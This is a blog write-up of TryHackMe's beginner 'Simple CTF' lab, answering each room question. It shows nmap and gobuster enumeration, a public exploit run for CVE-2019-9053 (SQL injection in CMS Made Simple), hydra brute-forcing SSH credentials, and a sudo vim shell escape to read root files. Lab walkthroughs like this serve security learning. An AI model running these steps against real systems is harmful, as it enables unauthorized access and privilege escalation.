---
author: Chance Johnson
date: 2023-03-31
description: A beginner friendly CTF by MrSeth6797 on TryHackMe.
layout: post
title: Simple CTF
---
[Simple CTF](https://tryhackme.com/room/easyctf) is a beginner friendly CTF on TryHackMe by MrSeth6797. I will be using Kali Linux.

# 1. How many services are running under port 1000?
I executed the following Nmap command to scan for both UDP and TCP services on this port:
```
sudo nmap -sS -sU -p1000 10.10.214.207
```

This tells me the following two services are running:
```
1000/tcp filtered      cadlock
1000/udp open|filtered ock
```

**Answer**: 2

### 2. What is running on the higher port?
[By default, Nmap scans the top 1,000 ports](By default, Nmap scans the top 1,000 ports for each scan protocol requested.), so there's a good chance the following command will tell me which service is listening to the highest port number:
```
nmap 10.10.214.207
```

Output:
```
PORT     STATE SERVICE
21/tcp   open  ftp
80/tcp   open  http
2222/tcp open  EtherNetIP-1
```

The scan tells us an [EtherNet/IP](https://en.wikipedia.org/wiki/EtherNet/IP) service is listening on `2222/tcp`. Nmap uses its [`nmap-services`](https://nmap.org/book/nmap-services.html) database to determine which services correspond to which port numbers. As you probably already know, applications can be configured to listen to any desired port number. Therefore, this information is not always reliable.

I'll investigate further with a version detection scan:
```
nmap -sV -p2222 10.10.214.207
```

Output:
```
PORT     STATE SERVICE VERSION
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

An Nmap [version detection](https://nmap.org/book/man-version-detection.html) scan uses the [`nmap-service-probes`](https://nmap.org/book/nmap-service-probes.html) database to determine what program is listening on a port. As you can see in the output above, Nmap has determined that an SSH server is listening on that port.

**Answer**: ssh

# 3. What's the CVE you're using against the application?
At first, I used the Nmap [vulners](https://raw.githubusercontent.com/vulnersCom/nmap-vulners/master/vulners.nse) script to list CVEs for the services listening on the open ports I had already discovered:
```
sudo nmap -sV -sS -sU -p21,80,2222,1000 --script=vulners 10.10.214.207
```

This produced an extensive list of CVEs, so I decided to go a different route and do some more enumeration.

I'll start by performing a version scan on `80/tcp`:
```
nmap -sV -p80 10.10.214.207
```

Output:
```
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

It appears an Apache HTTP server is listening to this port, so I will use `gobuster` to find some common directories:
```
gobuster dir -u http://10.10.214.207/ -w /usr/share/wordlists/dirb/common.txt
```

The following resources were found:
```
/.htpasswd
/.hta
/.htaccess
/index.html
/robots.txt
/server-status
/simple
```

I opened up Firefox and navigated to `http://10.10.214.207/simple`. It appeared to be an installation page for [CMS Made Simple](https://www.cmsmadesimple.org/). At the bottom of the page there was a version number: `2.2.8`.

A Google search for `cms made simple 2.2.8 cve` lead me to [CVE-2019-9053](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9053).

**Answer**: CVE-2019-9053

# 4. To what kind of vulnerability is the application vulnerable?
CVE-2019-9053 is recorded as an SQL injection vulnerability.

**Answer**: SQLi

# 5. What's the password?
I found [this](https://github.com/e-renna/CVE-2019-9053) Python script online for exploiting the CVE. Using this script, I ran the following command:
```
python3 exploit.py -u http://10.10.214.207/simple/
```

Output:
```
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
```

It would appear the found password is a hash of the original password and the salt. This isn't very useful, however it does list the username "mitch".

I'll attempt to login to that SSH server listening on `2222/tcp`:
```
hydra -s 2222 -l mitch -P /usr/share/wordlists/john.lst -t 4 10.10.214.207 ssh
```

The output of this command indicates the password is "secret". 

**Answer**: secret


# 6. Where can you login with the details obtained?
Obviously, the SSH server.

**Answer**: SSH

# 7. What's the user flag?
I logged into the SSH server with the newly found credentials, and found a "user.txt" file. The contents of the file read "G00d j0b, keep up!".

**Answer**: G00d j0b, keep up!

# 8. Is there any other user in the home directory? What's its name?
There was a directory named "sunbath" in the "/home" directory.

**Answer**: sunbath

# 9. What can you leverage to spawn a privileged shell?
I got stuck on this for a while. There weren't any more files in the user's home directory, and I wasn't able to perform many commands as sudo. I finally remembered to list which sudo commands can be performed:
```
sudo -l
```

Output:
```
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
```

It looks like I can use vim to run commands as the root user.

**Answer**: vim

# 10. What's the root flag?
I ran vim as sudo, and in vim I entered the following:
```
:!ls /root
```

This showed a `flag.txt` file. All that was left to do was print the contents of this file via vim:
```
:!cat /root/flag.txt
```

**Answer**: W3ll d0n3. You made it!


